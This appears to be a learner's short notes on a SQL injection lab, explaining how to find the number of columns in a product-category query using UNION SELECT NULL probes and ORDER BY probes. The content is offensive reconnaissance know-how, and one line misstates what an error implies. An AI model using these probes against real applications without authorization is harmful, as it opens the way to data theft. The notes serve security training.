SQli - Product Category filter

End Goal: Determine the number of columns returned by the query

backgrounf (Union):
- The number and the order of the columns must be the same on all queries
- The data types must be compatible

SQLi attack: (way 1)
We want to find out the number of columns ?

Select ? from table1 Union Select NULL
if error -> we know the column number is not 1
No error we figured out the column number

Select ? from table1 Union Select NULL, NULL
if error -> we know the column number is more than 2
no error we figured out the column number

SQLi attack: (way 2)

Select ? from table1 order by 1 - No error so there is 1 column
Select ? from table1 order by 2 - No error so there are 2 columns
Select ? from table1 order by 3 - error, so there are 2 columns and no more
